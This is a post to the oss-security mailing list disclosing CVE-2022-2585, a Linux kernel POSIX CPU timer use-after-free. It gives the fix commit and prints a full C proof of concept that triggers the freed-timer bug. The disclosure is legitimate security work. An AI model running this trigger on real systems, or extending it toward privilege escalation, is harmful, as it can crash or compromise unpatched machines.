Received: (qmail 10188 invoked by uid 550); 18 Aug 2022 07:26:13 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 15705 invoked from network); 17 Aug 2022 20:29:50 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=canonical.com;
	s=20210705; t=1660768179;
	bh=dkajsqrnkMq9UaNiMHYLjwcmcz2PJrWfLLE+in8eL30=;
	h=Date:From:To:Subject:Message-ID:References:MIME-Version:
	 Content-Type:In-Reply-To;
	b=MVc0FhJ5FqvuxNu98/NvUFSxaqrpDY7ZqSNBBjSbpTcaYI8Z9c4b+sfDkGNS9dswZ
	 ORI0dXrxhC65AYL11X3fEEUIz3uFh0la1VQFZrFxys2aDtrRbIxkJx4zD1RG1eJR3Y
	 LKb9DPVMFnAdrz9X2u4aC10sAe2GdU/NBqH50jAuMVixSEkPZ5BJPjG7r58jIm7ULZ
	 iFDXFkfYhBh15gMa131PVJoRti4MF7lCLmo5jGNYyGjs66M84PJQHY4ipn94wJ5e7z
	 n1+4DwUWCkAejlysrLIY6AmbHQKZ+IJeNgZKWPrEmCWrp0OEFcuhB3N1PFAfBT67I3
	 BKAqOCAHpEQiQ==
Date: Wed, 17 Aug 2022 17:29:35 -0300
From: Thadeu Lima de Souza Cascardo <cascardo@canonical.com>
To: oss-security@lists.openwall.com
Message-ID: <Yv1Pry60yZ6mOscO@quatroqueijos>
References: <YvKVxLtBs86r6Dmh@quatroqueijos>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
In-Reply-To: <YvKVxLtBs86r6Dmh@quatroqueijos>
Subject: Re: [oss-security] CVE-2022-2585 - Linux kernel POSIX CPU timer UAF

On Tue, Aug 09, 2022 at 02:13:40PM -0300, Thadeu Lima de Souza Cascardo wrote:
> CVE-2022-2585 - Linux kernel POSIX CPU timer UAF
> 
> It was discovered that when exec'ing from a non-leader thread, armed POSIX
> CPU timers would be left on a list but freed, leading to a use-after-free.
> 
> An independent security researcher working with SSD Secure Disclosure
> discovered that this vulnerability could be exploited for Local Privilege
> Escalation.
> 
> This bug was introduced by commit 55e8c8eb2c7b ("posix-cpu-timers: Store a
> reference to a pid not a task"), which is present since v5.7-rc1.
> 
> This has been assigned CVE-2022-2585.
> 
> A PoC that will trigger KASAN is going to be posted in a week.
> 
> A fix has been sent to linux-kernel@vger.kernel.org and is at
> https://lore.kernel.org/lkml/20220809170751.164716-1-cascardo@canonical.com/T/#u.

This has been merged as commit e362359ace6f87c201531872486ff295df306d13.

The PoC should be built with the name poc as that is what it tries to exec.

#define _GNU_SOURCE
#include <sched.h>
#include <time.h>
#include <unistd.h>
#include <sys/wait.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>

static int timer_uaf(void *d)
{
	timer_t tid;
	struct itimerspec its;

	its.it_interval.tv_sec = 3;
	its.it_interval.tv_nsec = 0;
	its.it_value.tv_sec = 3;
	its.it_value.tv_nsec = 0;
	timer_create(CLOCK_THREAD_CPUTIME_ID, NULL, &tid);
	timer_settime(tid, 0, &its, NULL);
	execlp("./poc", "poc1", NULL);
}

static char stack[8192];

int main(int argc, char **argv)
{
	timer_t tid;
	int i;

	if (!strcmp(argv[0], "poc1")) {
		sleep(2);
		exit(0);
	}

	if (fork() > 0) {
		waitpid(-1, NULL, 0);
		exit(0);
	}

	clone(timer_uaf, stack+4096, SIGCHLD | CLONE_VM | CLONE_SIGHAND | CLONE_THREAD, NULL, NULL, NULL);

	while(1);

	return 0;
}
